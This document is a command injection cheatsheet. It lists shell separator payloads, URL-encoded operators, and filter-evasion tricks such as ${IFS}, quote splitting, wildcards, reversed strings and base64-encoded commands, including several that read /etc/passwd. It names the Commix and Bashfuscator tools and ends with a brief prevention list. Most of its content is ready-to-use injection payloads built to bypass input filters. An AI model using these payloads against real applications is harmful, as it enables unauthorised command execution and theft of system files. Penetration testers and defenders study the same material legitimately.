# Command Injection Cheatsheet

## Introduction
Command Injection occurs when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application.

---

## Discovery

### Indicators
-   Parameters used in system operations (e.g., `ping`, `nslookup`, `convert`).
-   Time delays when using sleep commands.
-   Output differences when using true/false conditions.

### Basic Testing
Inject separators followed by a simple command.
```bash
; whoami
| whoami
|| whoami
& whoami
&& whoami
$(whoami)
`whoami`
```

---

## Injection Operators

| Operator | URL Encoded | Description |
| :--- | :--- | :--- |
| `;` | `%3b` | Executes commands sequentially. |
| `\n` | `%0a` | Newline character, executes commands sequentially. |
| `&` | `%26` | Background execution (often executes both). |
| `|` | `%7c` | Pipe (redirects stdout of first to stdin of second). |
| `&&` | `%26%26` | AND (executes second only if first succeeds). |
| `||` | `%7c%7c` | OR (executes second only if first fails). |
| `` ` `` | `%60%60` | Command substitution (Linux). |
| `$()` | `%24%28%29` | Command substitution (Linux). |

---

## Filter Evasion

### Space Filters
If spaces are blocked, use these alternatives:
-   **Tabs**: `%09`
-   **IFS Variable**: `${IFS}`
-   **Brace Expansion**: `{ls,-la}`
-   **Redirection**: `<` or `>` (e.g., `cat<file`)

**Examples:**
```bash
127.0.0.1%0a${IFS}
127.0.0.1%0a{ls,-la}
cat</etc/passwd
```

### Character Filters
If specific characters (like `/` or `;`) are blocked:
-   **Environment Variables**: Use substrings of env vars.
    ```bash
    echo ${PATH:0:1}       # Output: /
    echo ${LS_COLORS:10:1} # Output: ;
    ```
-   **Character Shifting**: Generate characters using `tr`.
    ```bash
    $(tr '!-}' '"-~'<<<[)  # Output: \
    ```

### Command Blacklists
If specific commands (like `whoami` or `cat`) are blocked:
-   **Quotes**: `w'h'o'am'i` or `w"h"o"am"i`
-   **Concatenation**: `a=who;b=ami;$a$b`
-   **Wildcards**: `/bin/c?? /etc/p?????`
-   **Reversing**: `$(rev<<<'imaohw')`
-   **Base64 Encoding**:
    ```bash
    bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
    ```
-   **Case Manipulation (Windows)**: `WhOaMi`

---

## Tools

### Commix
Automated All-in-One OS Command Injection and Exploitation Tool.
```bash
commix --url="http://target.com?param=TEST"
```

### Obfuscation Tools
-   **Bashfuscator** (Linux):
    ```bash
    ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
    ```
-   **DOSfuscation** (Windows): Interactive PowerShell tool for obfuscating CMD commands.

---

## Prevention

1.  **Input Validation**: Whitelist allowed characters (e.g., `^[a-zA-Z0-9]+$`).
2.  **Avoid System Calls**: Use language-specific libraries instead of `system()`, `exec()`, or `passthru()`.
3.  **Parameterized Commands**: If system calls are necessary, use functions that separate arguments (e.g., `execFile` in Node.js).
4.  **Least Privilege**: Run the web server as a low-privilege user.
5.  **WAF**: Use a WAF to block common injection patterns.
